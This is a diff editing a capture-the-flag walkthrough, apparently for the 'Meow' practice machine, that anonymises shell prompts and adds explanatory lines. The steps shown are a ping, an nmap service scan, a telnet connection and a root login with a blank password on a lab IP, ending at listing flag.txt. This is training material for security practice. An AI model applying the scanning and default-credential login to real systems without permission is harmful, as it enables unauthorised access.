@@ -46,7 +46,7 @@ What username is able to log into the target over telnet with a blank password?
 
 Ping the Target machine's IP address
 ```shell
-[cry_baby@ace ~]$ ping 10.129.190.255
+[user@localhost ~]$ ping 10.129.190.255
 PING 10.129.190.255 (10.129.190.255) 56(84) bytes of data.
 64 bytes from 10.129.190.255: icmp_seq=1 ttl=63 time=10.2 ms
 64 bytes from 10.129.190.255: icmp_seq=2 ttl=63 time=10.5 ms
@@ -57,9 +57,9 @@ PING 10.129.190.255 (10.129.190.255) 56(84) bytes of data.
 4 packets transmitted, 4 received, 0% packet loss, time 3004ms
 rtt min/avg/max/mdev = 10.216/10.303/10.452/0.093 ms
 ```
-Scan the Target machine's open ports
+Scan the Target machine's open ports using nmap
 ```shell
-[cry_baby@ace ~]$ nmap -sV 10.129.190.255
+[user@localhost ~]$ nmap -sV 10.129.190.255
 Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-14 21:50 EDT
 Nmap scan report for 10.129.190.255
 Host is up (0.010s latency).
@@ -73,7 +73,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.40 seconds
 ```
 After analyzing nmap's results, we can see that port 23 is open and is running the telnet service. Try connecting to the target using telnet.
 ```shell
-[cry_baby@ace ~]$ telnet 10.129.190.255
+[user@localhost ~]$ telnet 10.129.190.255
 Trying 10.129.190.255...
 Connected to 10.129.190.255.
 Escape character is '^]'.
@@ -87,7 +87,7 @@ Escape character is '^]'.
 
 Meow login:
 ```
-
+A login Banner apears, try logging in with default credentials
 ```shell
 Meow Login: root
 Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
@@ -123,7 +123,7 @@ To check for new updates run: sudo apt update
 Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
 root@Meow:~#
 ```
-
+Successfully logged in with a shell, take a look through the file struture
 ```shell
 root@Meow:~# ls
 flag.txt  snap
